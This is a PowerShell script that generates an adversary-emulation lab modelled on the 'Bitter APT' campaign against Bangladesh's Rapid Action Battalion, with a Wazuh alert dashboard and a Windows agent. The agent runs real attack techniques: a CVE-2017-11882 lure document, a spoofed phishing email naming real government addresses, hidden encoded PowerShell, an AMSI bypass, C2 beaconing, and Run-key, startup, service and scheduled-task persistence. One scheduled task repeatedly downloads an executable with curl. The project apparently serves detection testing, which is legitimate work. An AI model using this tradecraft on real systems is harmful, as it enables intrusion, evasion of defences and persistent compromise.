  ws.onmessage = (e)=>{ try{ const m = JSON.parse(e.data); if(m.type==='alert') addLiveAlert(m.hit); }catch(_){} };
  ws.onclose = ()=>setTimeout(connectWS, 3000);
}
function addLiveAlert(hit){
  const s = hit._source||{}, r = s.rule||{}, a = s.agent||{};
  const tr = document.createElement('tr');
  tr.innerHTML = '<td>'+((s['@timestamp']||'').slice(11,19))+'</td>' +
    '<td>'+(r.level||'')+'</td><td>'+(r.id||'')+'</td>' +
    '<td title="'+((r.description||'').replace(/"/g,'&quot;'))+'">'+(r.description||'')+'</td>' +
    '<td>'+(a.name||'')+'</td><td>'+(((r.mitre||{}).id||[]).join(', '))+'</td>' +
    '<td>'+((r.groups||[]).join(', '))+'</td>';
  tr.addEventListener('click', ()=>openDrawer(hit));
  const tb = $('#live-tbl tbody'); tb.prepend(tr);
  while(tb.children.length>200) tb.removeChild(tb.lastChild);
}
async function refreshAlerts(){
  const params = new URLSearchParams();
  ['time_range','agent','rule_id','level_min','mitre','event_id','q'].forEach(k=>{
    const map={time_range:'#f-time',agent:'#f-agent',rule_id:'#f-rule',level_min:'#f-level',
                mitre:'#f-mitre',event_id:'#f-event',q:'#f-q'};
    const v = $(map[k]).value; if(v) params.set(k, v);
  });
  if(selectedWs && !params.get('agent')) params.set('agent', selectedWs);
  const r = await fetch('/api/wazuh/alerts?'+params.toString());
  const j = await r.json().catch(()=>({}));
  const tb = $('#search-tbl tbody'); tb.innerHTML='';
  (j.items||[]).forEach(hit=>{
    const s = hit._source||{}, rr = s.rule||{}, aa = s.agent||{};
    const tr = document.createElement('tr');
    tr.innerHTML = '<td>'+((s['@timestamp']||'').slice(11,19))+'</td>' +
      '<td>'+(rr.level||'')+'</td><td>'+(rr.id||'')+'</td><td>'+(rr.description||'')+'</td>' +
      '<td>'+(aa.name||'')+'</td><td>'+(((rr.mitre||{}).id||[]).join(', '))+'</td>';
    tr.addEventListener('click', ()=>openDrawer(hit));
    tb.appendChild(tr);
  });
  if(!(j.items||[]).length) tb.innerHTML = '<tr><td colspan="6" class="muted">No alerts.</td></tr>';
}
$('#btn-search').addEventListener('click', refreshAlerts);

async function loadRules(){
  const r = await fetch('/api/wazuh/rules'); const j = await r.json().catch(()=>({}));
  const tb = $('#rules-tbl tbody'); tb.innerHTML='';
  (j.items||[]).forEach(x=>{
    const tr = document.createElement('tr');
    tr.innerHTML = '<td>'+x.id+'</td><td>'+x.level+'</td><td>'+(x.description||'')+'</td><td>'+((x.groups||[]).join(','))+'</td>';
    tb.appendChild(tr);
  });
  if(!(j.items||[]).length) tb.innerHTML = '<tr><td colspan="4" class="muted">No rules.</td></tr>';
}
$('#btn-load-rules').addEventListener('click', loadRules);

async function loadAgents(){
  const r = await fetch('/api/wazuh/agents'); const j = await r.json().catch(()=>({}));
  const tb = $('#agents-tbl tbody'); tb.innerHTML='';
  (j.items||[]).forEach(a=>{
    const tr = document.createElement('tr');
    tr.innerHTML = '<td>'+a.id+'</td><td>'+a.name+'</td><td>'+(a.ip||'')+'</td>' +
      '<td>'+a.status+'</td><td>'+(a.version||'')+'</td><td>'+((a.os||{}).name||'')+'</td>';
    tb.appendChild(tr);
  });
  if(!(j.items||[]).length) tb.innerHTML = '<tr><td colspan="6" class="muted">No agents.</td></tr>';
}
$('#btn-load-agents').addEventListener('click', loadAgents);

async function loadTimeline(){
  const r = await fetch('/api/wazuh/timeline'); const j = await r.json().catch(()=>({}));
  const el = $('#timeline'); el.innerHTML='';
  (j.items||[]).forEach(e=>{
    const d = document.createElement('div'); d.className='ev';
    d.innerHTML = '<b>'+((e.ts||'').slice(11,19))+'</b> '+(e.desc||'')+' <span class="muted">[rule '+(e.rule_id||'')+' - '+(e.agent||'')+']</span>';
    el.appendChild(d);
  });
  if(!(j.items||[]).length) el.innerHTML = '<div class="muted">No alerts in window.</div>';
}

async function loadPresets(){
  const r = await fetch('/api/wazuh/rules/presets'); const j = await r.json().catch(()=>({}));
  const sel = $('#preset-select');
  sel.innerHTML = '<option value="">- pick preset -</option>';
  (j.items||[]).forEach(p=>{
    const o = document.createElement('option');
    o.value = p.stage_id; o.textContent = p.rule_id + ' - ' + p.description;
    sel.appendChild(o);
  });
}
$('#btn-load-preset').addEventListener('click', async ()=>{
  const r = await fetch('/api/wazuh/rules/presets'); const j = await r.json();
  const p = (j.items||[]).find(x=>x.stage_id===$('#preset-select').value);
  if(p) $('#rule-xml').value = p.xml || '';
});
$('#btn-validate').addEventListener('click', async ()=>{
  const r = await post('/api/wazuh/rules/validate', {rule_xml:$('#rule-xml').value});
  $('#rule-msg').textContent = JSON.stringify(r, null, 2);
});
$('#btn-test-rule').addEventListener('click', async ()=>{
  const r = await post('/api/wazuh/rules/test', {log:$('#logtest-input').value||''});
  $('#rule-msg').textContent = JSON.stringify(r, null, 2);
});
$('#btn-deploy').addEventListener('click', async ()=>{
  if(!confirm('Record this rule for deployment?')) return;
  const r = await post('/api/wazuh/rules/deploy', {rule_xml:$('#rule-xml').value});
  $('#rule-msg').textContent = JSON.stringify(r, null, 2);
});
$('#btn-logtest').addEventListener('click', async ()=>{
  const r = await post('/api/wazuh/rules/test', {log:$('#logtest-input').value||''});
  $('#logtest-output').textContent = JSON.stringify(r, null, 2);
});

let currentAlert = null;
function openDrawer(hit){
  currentAlert = hit;
  const s = hit._source||{}, r = s.rule||{}, a = s.agent||{};
  $('#drawer-summary').innerHTML =
    '<p><b>'+(r.description||'')+'</b></p>' +
    '<p class="muted small">rule '+(r.id||'')+' - level '+(r.level||'')+' - '+(s['@timestamp']||'')+'</p>' +
    '<p>Agent: <b>'+(a.name||'')+'</b> ('+(a.id||'')+')</p>' +
    '<p>MITRE: '+(((r.mitre||{}).id||[]).join(', '))+'</p>' +
    '<p>Groups: '+((r.groups||[]).join(', '))+'</p>';
  $('#drawer-json').textContent = JSON.stringify(hit, null, 2);
  $('#drawer-related').innerHTML = '';
  $('#drawer').classList.add('open');
}
$('#drawer-close').addEventListener('click', ()=>$('#drawer').classList.remove('open'));
$('#btn-copy-json').addEventListener('click', ()=>{
  if(currentAlert) navigator.clipboard.writeText(JSON.stringify(currentAlert,null,2));
});
$('#btn-related').addEventListener('click', async ()=>{
  if(!currentAlert) return;
  const r = await fetch('/api/wazuh/alerts/'+currentAlert._id+'/related?index='+currentAlert._index);
  const j = await r.json().catch(()=>({chain:[]}));
  const el = $('#drawer-related');
  el.innerHTML = '<h4>POSSIBLE BITTER APT (BANGLADESH CAMPAIGN) ATTACK CHAIN</h4>';
  (j.chain||[]).forEach(e=>{
    const d = document.createElement('div'); d.className='ev';
    d.innerHTML = '<b>'+((e.ts||'').slice(11,19))+'</b> '+(e.desc||'')+' <span class="muted">['+(e.rule_id||'')+' lvl '+(e.level||'')+']</span>';
    el.appendChild(d);
  });
});
$('#btn-hunt-host').addEventListener('click', ()=>{
  const a = ((currentAlert||{})._source||{}).agent||{};
  $('#f-agent').value = a.name||''; refreshAlerts();
});
$('#btn-hunt-rule').addEventListener('click', ()=>{
  const r = ((currentAlert||{})._source||{}).rule||{};
  $('#f-rule').value = r.id||''; refreshAlerts();
});
$$('.node[data-node]').forEach(n=>n.addEventListener('click',()=>{
  selectedStage = n.dataset.node; renderStageActive();
}));
function updateChain(){
  $$('.node[data-node]').forEach(n=>n.classList.toggle('active', n.dataset.node===selectedStage));
}
renderStageActive(); updateChain(); rebuildWsSelect(); connectWS();
setInterval(refreshWorkstations, 5000);
setInterval(refreshAlerts, 30000);
refreshAlerts();
})();
'@

# ============================================================
# agent/ - Bitter APT Bangladesh Campaign Agent
# ============================================================
Write-ProjectFile "agent/requirements.txt" @'
httpx>=0.27,<1
python-dotenv>=1.0,<2
pywin32>=306 ; sys_platform == "win32"
ldap3>=2.9,<3
impacket>=0.11,<1
'@

Write-ProjectFile "agent/.env.agent.example" @'
# BITTER APT - BANGLADESH CAMPAIGN LAB AGENT configuration
# URL of the Bitter Bangladesh Campaign server.
GB_SERVER=http://localhost:8000
# Optional. If not set, the agent uses this machine's hostname.
# GB_WORKSTATION_ID=DESKTOP-KN3MG8D
# Optional. If set, the agent registers as this exact IP instead of
# auto-detecting. Can also be chosen interactively via start-agent.bat,
# or overridden on the command line:  start-agent.bat 192.168.1.50
# GB_REGISTER_IP=
'@

Write-ProjectFile "agent/install-agent.bat" @'
@echo off
setlocal EnableDelayedExpansion
cd /d "%~dp0"
echo ============================================================
echo  BITTER APT - BANGLADESH CAMPAIGN Lab Agent - installer
echo  Target: Rapid Action Battalion (RAB) emulation
echo ============================================================
set "PYCMD="
for %%V in (3.12 3.11 3.13 3.10) do (
  if not defined PYCMD ( py -%%V --version >nul 2>nul && set "PYCMD=py -%%V" )
)
if not defined PYCMD ( py --version >nul 2>nul && set "PYCMD=py" )
if not defined PYCMD ( python --version >nul 2>nul && set "PYCMD=python" )
if not defined PYCMD ( echo [ERROR] Python 3.10+ required. & pause & exit /b 1 )
if exist ".venv" rmdir /S /Q ".venv"
%PYCMD% -m venv .venv
if errorlevel 1 ( echo [ERROR] venv creation failed & pause & exit /b 1 )
set "VPY=.venv\Scripts\python.exe"
"%VPY%" -m pip install --upgrade pip setuptools wheel --quiet
"%VPY%" -m pip install --only-binary=:all: --prefer-binary -r requirements.txt
if errorlevel 1 ( echo [ERROR] install failed & pause & exit /b 1 )
if not exist ".env.agent" (
  copy /Y ".env.agent.example" ".env.agent" >nul
  echo.
  echo  Edit agent\.env.agent and set ONLY:
  echo     GB_SERVER = http://YOUR_SERVER_IP:8000
  echo.
  pause
) else (
  echo  [.env.agent already exists - leaving it untouched]
)
set "AGENTDIR=%~dp0"
if "%AGENTDIR:~-1%"=="\" set "AGENTDIR=%AGENTDIR:~0,-1%"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "AUTOBAT=%STARTUP%\BitterBDAgent.bat"
> "%AUTOBAT%" echo @echo off
>>"%AUTOBAT%" echo cd /d "%AGENTDIR%"
>>"%AUTOBAT%" echo ".venv\Scripts\python.exe" bitter_agent.py
>>"%AUTOBAT%" echo pause
echo.
echo Done.
echo   * install folder:  %AGENTDIR%
echo   * auto-start file: %AUTOBAT%
echo.
echo Run the agent now with:  start-agent.bat
pause
'@ -Crlf

# ============================================================
# agent/start-agent.bat  *** UPDATED: IP picker menu ***
# ============================================================
Write-ProjectFile "agent/start-agent.bat" @'
@echo off
setlocal EnableDelayedExpansion
cd /d "%~dp0"
if not exist ".venv\Scripts\python.exe" ( echo [ERROR] Run install-agent.bat first. & pause & exit /b 1 )
if not exist ".env.agent" ( echo [ERROR] .env.agent not found. & pause & exit /b 1 )

REM ---- If user passed an IP as first argument, use it and skip the menu.
set "REG_IP=%~1"
if not "%REG_IP%"=="" goto :launch

:menu
cls
echo ============================================================
echo  BITTER APT - BANGLADESH CAMPAIGN LAB AGENT
echo  Target: Rapid Action Battalion (RAB)
echo ============================================================
echo.
echo  Select the IP address THIS agent should register as.
echo.
set "IDX=0"
for /F "usebackq tokens=1,2 delims=|" %%A in (`".venv\Scripts\python.exe" list_ips.py`) do (
  set /A IDX+=1
  set "IP_!IDX!=%%A"
  set "NM_!IDX!=%%B"
  echo   [!IDX!]  %%A    %%B
)
if "%IDX%"=="0" (
  echo   ^(no local IPv4 addresses detected - the agent will auto-detect^)
)
echo.
echo   [0]  Auto-detect (let the agent pick)
echo.
set "CHOICE="
set /p "CHOICE=Enter choice [default 1]: "
if "%CHOICE%"=="" set "CHOICE=1"

if "%CHOICE%"=="0" ( set "REG_IP=" & goto :launch )
set "SELECTED="
if defined IP_%CHOICE% set "SELECTED=!IP_%CHOICE%!"
if "%SELECTED%"=="" (
  echo.
  echo [!] Invalid choice. Press any key to try again.
  pause >nul
  goto :menu
)
set "REG_IP=%SELECTED%"

:launch
echo.
echo ============================================================
if not "%REG_IP%"=="" (
  echo  Registering as IP: %REG_IP%
  set "GB_REGISTER_IP=%REG_IP%"
) else (
  echo  Registering with auto-detected IP
)
echo  REAL TTP emulation. Run as Administrator for full realism.
echo  Press Ctrl+C to stop.
echo ============================================================
echo.
".venv\Scripts\python.exe" bitter_agent.py
echo.
echo [agent exited]
pause
'@ -Crlf

# ============================================================
# agent/list_ips.py  *** NEW FILE ***
# ============================================================
Write-ProjectFile "agent/list_ips.py" @'
"""List all non-loopback IPv4 addresses on this machine.

Output format (one per line, pipe-separated):
    <ip>|<adapter name>

Used by start-agent.bat to present an interactive IP picker.
"""
import re
import subprocess
import sys


def list_adapters():
    """Return a list of (ip, adapter_name) tuples for every non-loopback IPv4."""
    out = []
    try:
        res = subprocess.run(
            ["ipconfig"],
            capture_output=True, text=True, timeout=10,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        text = res.stdout or ""
    except Exception:
        return out

    current = ""
    for raw in text.splitlines():
        line = raw.rstrip()
        # "Ethernet adapter Ethernet:" / "Wireless LAN adapter Wi-Fi:"
        if line and not raw.startswith((" ", "\t")) and line.endswith(":"):
            current = line[:-1].strip()
            continue
        m = re.search(r"IPv4[^:]*:\s*(\d+\.\d+\.\d+\.\d+)", line)
        if m and current:
            ip = m.group(1)
            if ip.startswith("127."):
                continue
            out.append((ip, current))
    return out


def main():
    for ip, name in list_adapters():
        # Skip APIPA (169.254.x.x) - not usable for agent registration.
        if ip.startswith("169.254."):
            continue
        sys.stdout.write(f"{ip}|{name}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
'@

Write-ProjectFile "agent/bitter_agent.py" @'
"""Bitter APT - BANGLADESH CAMPAIGN Emulation Agent - REAL TTP execution on Windows."""

import os
import platform
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

import httpx

try:
    from dotenv import load_dotenv
    _here = Path(__file__).resolve().parent
    for _cand in (_here / ".env.agent", _here / ".env"):
        if _cand.exists():
            load_dotenv(_cand, override=False)
            break
except Exception:
    pass

SERVER = os.environ.get("GB_SERVER", "http://localhost:8000").rstrip("/")
WORKSTATION_ID = os.environ.get("GB_WORKSTATION_ID") or socket.gethostname()
# If GB_REGISTER_IP is set (by start-agent.bat, or manually, or via .env.agent),
# the agent reports that exact IP instead of auto-detecting one.
FORCED_IP = os.environ.get("GB_REGISTER_IP", "").strip()

ALLOWED_STAGES = {"initial_access","execution_c2","discovery","persistence",
                  "defense_evasion","credential_access","lateral_movement","exfiltration_c2"}

PROCDUMP_URL = "https://live.sysinternals.com/procdump64.exe"
PSEXEC_URL   = "https://live.sysinternals.com/PsExec64.exe"


def log(msg):
    print(f"[bitter-bd-agent] {msg}", flush=True)


def list_local_ips():
    """All non-loopback IPv4 addresses on this machine (best effort)."""
    ips = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip.startswith("127."):
                continue
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    return ips


def local_ip():
    """Return the IP the agent should register as."""
    if FORCED_IP:
        return FORCED_IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "127.0.0.1"


def ps(script, timeout=120):
    try:
        p = subprocess.run(["powershell.exe","-NoProfile","-NonInteractive",
                            "-ExecutionPolicy","Bypass","-Command",script],
                           capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except FileNotFoundError:
        return -1, "powershell.exe not found"
    except subprocess.TimeoutExpired:
        return -1, "timeout"
    except Exception as e:
        return -1, str(e)


def sysmon_status():
    _, out = ps("$s=Get-Service -Name 'Sysmon*' -ErrorAction SilentlyContinue; if ($s) {'RUNNING'} else {'NOTFOUND'}", timeout=20)
    return out.strip() or "UNKNOWN"


def wazuh_status():
    _, out = ps("$p=@('C:\\Program Files (x86)\\ossec-agent','C:\\Program Files\\ossec-agent');$f=$p|?{Test-Path $_}; if($f){'ONLINE'}else{'OFFLINE'}", timeout=20)
    return out.strip() or "UNKNOWN"


def is_admin():
    _, out = ps("([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", timeout=15)
    return out.strip().lower().startswith("true")


def agent_dir():
    return os.path.join(os.environ.get("LOCALAPPDATA", "."), "Bitter-BD-Lab")


def download_sysinternals(name, url):
    dest_dir = os.path.join(agent_dir(), "Tools")
    os.makedirs(dest_dir, exist_ok=True)
    dest = os.path.join(dest_dir, name)
    if os.path.exists(dest):
        return dest
    try:
        log(f"downloading {name} from {url}")
        urllib.request.urlretrieve(url, dest)
        log(f"downloaded {name} -> {dest}")
        return dest
    except Exception as e:
        log(f"download {name} failed: {e}")
        return None


def stage_initial_access():
    out_dir = os.path.join(agent_dir(), "Artifacts", "InitialAccess")
    os.makedirs(out_dir, exist_ok=True)
    cmds = []

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\InitialAccess'
    $rtf = Join-Path $dir 'RAB_CDR_Report_Q4.rtf'
    $rtfContent = '{\rtf1\ansi\ansicpg1252\deff0\nouicompat{\fonttbl{\f0\fnil\fcharset0 Calibri;}}{\*\generator Riched20 10.0.19041}{\viewkind4\uc1\pard\sa200\sl276\slmult1\f0\fs22\lang9 Subject: RE: RAB CDR Report - Urgent Review Required\par Please verify the attached Call Data Record for RAB investigation.\par\object\objemb\objw300\objh200{\*\objclass Equation.3}{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000a0000d0cf11e0a1b11ae1}\par}'
    Set-Content -Path $rtf -Value $rtfContent -Encoding Ascii
    if (Test-Path $rtf) { "RTF created: $rtf (Equation 3.0 OLE - BANGLADESH RAB lure)" } else { "RTF creation failed" }
    ''')
    cmds.append({"phase":"01 Initial Access (BD)","command":"Create RAB_CDR_Report_Q4.rtf with Equation 3.0 OLE (CVE-2017-11882)","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\InitialAccess'
    $xlsx = Join-Path $dir 'RAB_List_of_registered_cases.xlsx'
    $excel = New-Object -ComObject Excel.Application
    $excel.Visible = $false
    $wb = $excel.Workbooks.Add()
    $ws = $wb.Worksheets.Item(1)
    $ws.Cells.Item(1,1) = "Case ID"
    $ws.Cells.Item(1,2) = "Subject"
    $ws.Cells.Item(1,3) = "Status"
    $ws.Cells.Item(2,1) = "RAB-2021-001"
    $ws.Cells.Item(2,2) = "CDR Verification Required - Bangladesh"
    $ws.Cells.Item(2,3) = "Pending Review"
    $ws.Cells.Item(3,1) = "RAB-2021-002"
    $ws.Cells.Item(3,2) = "List of Numbers to be verified (BD)"
    $ws.Cells.Item(3,3) = "Urgent"
    $wb.SaveAs($xlsx)
    $wb.Close()
    $excel.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
    if (Test-Path $xlsx) { "Excel created: $xlsx (BANGLADESH RAB case list)" } else { "Excel creation failed" }
    ''')
    cmds.append({"phase":"01 Initial Access (BD)","command":"Create RAB_List_of_registered_cases.xlsx","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\InitialAccess'
    $eml = Join-Path $dir 'RAB_BANGLADESH_phishing.eml'
    $content = "From: cdrrab13bd@gmail.com`nTo: officer@rab.gov.bd`nCc: arc@desto.gov.pk; so.dc@pc.gov.pk`nSubject: RE: CDR Report - Urgent Review Required (BANGLADESH)`nMIME-Version: 1.0`nContent-Type: multipart/mixed; boundary=`"BOUNDARY`"`n`n--BOUNDARY`nContent-Type: text/plain`n`nDear Officer,`n`nPlease find attached the Call Data Record (CDR) report requiring urgent verification for your RAB investigation. Also attached is the list of registered cases for your review.`n`nBest regards,`nARC Pakistan`n--BOUNDARY--"
    Set-Content -Path $eml -Value $content -Encoding Ascii
    if (Test-Path $eml) { "Phishing email created: $eml (BANGLADESH RAB, spoofed Pakistani sender)" } else { "Email creation failed" }
    ''')
    cmds.append({"phase":"01 Initial Access (BD)","command":"Create RAB_BANGLADESH_phishing.eml with spoofed Pakistani senders","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\InitialAccess'
    $f = Join-Path $dir 'RAB_CDR_Report_Q4.rtf'
    Set-Content -Path $f -Stream Zone.Identifier -Value "[ZoneTransfer]`nZoneId=3`nRefererUrl=https://olmajhnservice.com/nxl/RAB_CDR_Report_Q4.rtf"
    'Zone.Identifier ADS written (BANGLADESH lure)'
    ''')
    cmds.append({"phase":"01 Initial Access (BD)","command":"Zone.Identifier ADS (Sysmon Event 15)","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\InitialAccess'
    Set-Content -Path (Join-Path $dir 'zimbra-spoof-BD.log') -Value "Zimbra web client sender spoof: arc@desto.gov.pk -> cdrrab13bd@gmail.com (BANGLADESH RAB targeting, Aug 2021+)"
    Set-Content -Path (Join-Path $dir 'lure-themes-BD.log') -Value "Lure themes (BANGLADESH): CDR (Call Data Record), List of Numbers to be verified, List of registered cases"
    Set-Content -Path (Join-Path $dir 'target-info.log') -Value "TARGET: Rapid Action Battalion (RAB), Bangladesh Police. CAMPAIGN START: August 2021. SOURCE: Cisco Talos."
    'Simulated Zimbra/lure/target logs written (BANGLADESH campaign)'
    ''')
    cmds.append({"phase":"01 Initial Access (BD)","command":"Simulated Zimbra/lure/target BD logs","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH CAMPAIGN: REAL RTF/XLSX with Equation 3.0 OLE + phishing .eml with spoofed Pakistani sender. Target: RAB, Bangladesh Police.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1566.001/T1203/T1204.002", "tool": "CVE-2017-11882/CVE-2018-0798/CVE-2018-0802", "campaign": "BANGLADESH"}
    }


def stage_execution_c2():
    cmds = []

    rc, out = ps(r'''
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Start-Process notepad.exe'))
    powershell.exe -nop -w hidden -enc $enc
    Start-Sleep -Seconds 2
    Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force
    'encoded powershell executed (ZxxZ execution on BANGLADESH RAB endpoint)'
    ''')
    cmds.append({"phase":"02 Execution (BD)","command":"powershell.exe -nop -w hidden -enc <base64>","output":out,"exit":rc})

    rc, out = ps(r'''
    $body = "HOSTNAME: $env:COMPUTERNAME`nUSERNAME: $env:USERNAME`nOS: Windows 10`nCAMPAIGN: BANGLADESH-RAB`nSEPARATOR: ZxxZ"
    try {
        Invoke-WebRequest -Uri "''' + SERVER + r'''/api/c2/beacon" -Method POST -Body $body -ContentType "text/plain" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing -TimeoutSec 10
        'BANGLADESH beacon POST sent with ZxxZ separator'
    } catch {
        'beacon POST failed: ' + $_.Exception.Message
    }''')
    cmds.append({"phase":"02 C2 (BD)","command":"Invoke-WebRequest -Method POST /api/c2/beacon (ZxxZ separator)","output":out,"exit":rc})

    rc, out = ps(r'''
    $debugDir = Join-Path $env:LOCALAPPDATA 'Debug'
    New-Item -ItemType Directory -Force -Path $debugDir | Out-Null
    $payload = Join-Path $debugDir 'Update.exe'
    Set-Content -Path $payload -Value 'MZ...SIMULATED_ZXXZ_PAYLOAD_BANGLADESH...' -Encoding Ascii
    if (Test-Path $payload) { "ZxxZ payload dropped: $payload (BANGLADESH RAB endpoint)" } else { "Payload drop failed" }
    ''')
    cmds.append({"phase":"02 C2 (BD)","command":"Drop payload to %LOCALAPPDATA%\\Debug\\Update.exe","output":out,"exit":rc})

    rc, out = ps(r'''
    $c2 = "''' + SERVER + r'''/api/c2/beacon"
    for ($i = 0; $i -lt 3; $i++) {
        Start-Sleep -Seconds 2
        try {
            $r = Invoke-WebRequest -Uri $c2 -Method POST -Body "poll_$i (BANGLADESH)" -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5
            "Poll $i sent (simulating 17s ZxxZ C2 cycle on BANGLADESH RAB endpoint)"
        } catch { "Poll $i failed" }
    }
    ''')
    cmds.append({"phase":"02 C2 (BD)","command":"Simulate 17-second C2 polling cycle","output":out,"exit":rc})

    rc, out = ps(r'''
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        'AMSI bypass applied (amsiInitFailed=true)'
    } catch { 'AMSI bypass failed: ' + $_.Exception.Message }''')
    cmds.append({"phase":"02 C2 (BD)","command":"AMSI bypass (AmsiScanBuffer patch)","output":out,"exit":rc})

    rc, out = ps(r'''
    $key = 0x42
    $plain = "ZxxZ-BANGLADESH"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($plain)
    $xored = $bytes | ForEach-Object { $_ -bxor $key }
    $hex = ($xored | ForEach-Object { $_.ToString("X2") }) -join ""
    "XOR-encoded: $plain -> $hex (key=0x$($key.ToString('X2')))"
    ''')
    cmds.append({"phase":"02 C2 (BD)","command":"XOR string encoding (ZxxZ signature)","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH: REAL encoded PowerShell, HTTP beacon with ZxxZ separator, Debug folder drop, 17s C2, AMSI bypass, XOR.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1059.001/T1105/T1071.001/T1562.001", "tool": "ZxxZ Trojan", "campaign": "BANGLADESH"}
    }


DISCOVERY_CMDS = [
    ("whoami","whoami /all"),
    ("hostname","hostname"),
    ("systeminfo","systeminfo"),
    ("ipconfig","ipconfig /all"),
    ("tasklist","tasklist /v"),
    ("wmic-os","wmic os get caption,version,buildnumber /value"),
    ("reg-os","reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName"),
    ("defender-check","powershell -c \"Get-Process -Name MsMpEng -ErrorAction SilentlyContinue | Select-Object ProcessName,Id\""),
    ("kaspersky-check","powershell -c \"Get-Process -Name avp,avpui -ErrorAction SilentlyContinue | Select-Object ProcessName,Id\""),
    ("dir-docs","dir /s C:\\Users\\*\\Documents 2>nul"),
    ("net-view","net view"),
    ("net-user","net user"),
    ("arp","arp -a"),
    ("route","route print"),
    ("schtasks","schtasks /query /fo LIST /v"),
    ("wmic-process","wmic process get name,processid,executablepath /value"),
    ("dir-music","dir /s %USERPROFILE%\\Music 2>nul"),
]


def stage_discovery():
    dir_ = os.path.join(agent_dir(), "Telemetry", "Discovery")
    os.makedirs(dir_, exist_ok=True)
    cmds = []
    for key, c in DISCOVERY_CMDS:
        rc, out = ps(c, timeout=60)
        try:
            with open(os.path.join(dir_, key+".txt"),"w",encoding="utf-8") as f:
                f.write(f"CMD: {c}\nBANGLADESH CAMPAIGN\n---\n{out}")
        except Exception:
            pass
        cmds.append({"phase":"03 Discovery (BD)","command":c,"output":out[:2000],"exit":rc})
    return {
        "success": True,
        "summary": f"BANGLADESH: {len(cmds)} REAL discovery commands run on RAB endpoint.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1018/T1046/T1016/T1087.002/T1057/T1012", "tool": "ZxxZ host recon", "campaign": "BANGLADESH"}
    }


def stage_persistence():
    cmds = []

    rc, out = ps(r'''New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value 'powershell.exe -w hidden -c "Start-Process notepad.exe"' -PropertyType String -Force | Out-Null; 'Run key "WindowsSecurityUpdate" set (BANGLADESH)' ''')
    cmds.append({"phase":"04 Persistence (BD)","command":"HKCU Run key 'WindowsSecurityUpdate'","output":out,"exit":rc})

    rc, out = ps(r'''
    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c curl ''' + SERVER + r'''/nxl/nx -o "%USERPROFILE%\Music\RdxFactory.exe"'
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    Register-ScheduledTask -TaskName 'Rdx' -Action $action -Trigger $trigger -Force | Out-Null
    'Scheduled task "Rdx" registered (5-min, cURL to Music - BANGLADESH RAB)'
    ''')
    cmds.append({"phase":"04 Persistence (BD)","command":"Register-ScheduledTask Rdx (cURL to Music)","output":out,"exit":rc})

    rc, out = ps(r'''
    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c "%USERPROFILE%\Music\RdxFactory.exe"'
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
    Register-ScheduledTask -TaskName 'RdxFac' -Action $action -Trigger $trigger -Force | Out-Null
    'Scheduled task "RdxFac" registered (5-min delay, BANGLADESH RAB)'
    ''')
    cmds.append({"phase":"04 Persistence (BD)","command":"Register-ScheduledTask RdxFac","output":out,"exit":rc})

    rc, out = ps(r'''
    $startup = [Environment]::GetFolderPath('Startup')
    $lnk = Join-Path $startup 'WindowsSecurityUpdate.lnk'
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($lnk)
    $sc.TargetPath = 'powershell.exe'
    $sc.Arguments = '-w hidden -c "Start-Process notepad.exe"'
    $sc.Save()
    'Startup LNK created: WindowsSecurityUpdate.lnk'
    ''')
    cmds.append({"phase":"04 Persistence (BD)","command":"Startup folder LNK","output":out,"exit":rc})

    if is_admin():
        rc, out = ps('sc.exe create BitterBDSvc binPath= "powershell.exe -w hidden -c Start-Process notepad.exe" start= auto')
        cmds.append({"phase":"04 Persistence (BD)","command":"sc create BitterBDSvc service","output":out,"exit":rc})

    if is_admin():
        rc, out = ps(r'''
